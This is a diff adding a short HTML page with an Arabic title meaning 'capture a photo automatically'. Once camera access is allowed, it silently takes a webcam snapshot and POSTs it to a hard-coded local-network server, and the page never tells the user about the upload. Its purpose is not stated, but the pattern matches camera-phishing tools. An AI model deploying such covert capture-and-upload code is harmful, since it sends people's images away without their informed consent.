@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التقاط صورة تلقائيًا</title>
+    <style>
+        #photo {
+            display: none;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h1>التقاط صورة تلقائيًا</h1>
+    <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
+    <img id="photo" alt="صورة ملتقطة" />
+
+    <script>
+        // الوصول إلى الكاميرا
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const photo = document.getElementById('photo');
+
+        // طلب الوصول إلى الكاميرا
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                // التقاط الصورة تلقائيًا بعد بدء تشغيل الفيديو
+                video.onloadedmetadata = () => {
+                    // إعطاء بعض الوقت للفيديو ليبدأ بشكل صحيح
+                    setTimeout(() => {
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        photo.src = canvas.toDataURL('image/png');
+                        photo.style.display = 'block';
+
+                        // إيقاف الفيديو بعد التقاط الصورة
+                        stream.getTracks().forEach(track => track.stop());
+
+                        // إرسال الصورة إلى الخادم
+                        const imageData = canvas.toDataURL('image/png');
+                        fetch('http://192.168.1.109:8000', {
+                            method: 'POST',
+                            body: JSON.stringify({ image: imageData }),
+                            headers: { 'Content-Type': 'application/json' }
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log('Success:', data);
+                        })
+                        .catch((error) => {
+                            console.error('Error:', error);
+                        });
+                    }, 500); // الانتظار نصف ثانية قبل التقاط الصورة
+                };
+            })
+            .catch(err => {
+                console.error("حدث خطأ: " + err);
+            });
+    </script>
+</body>
+</html>
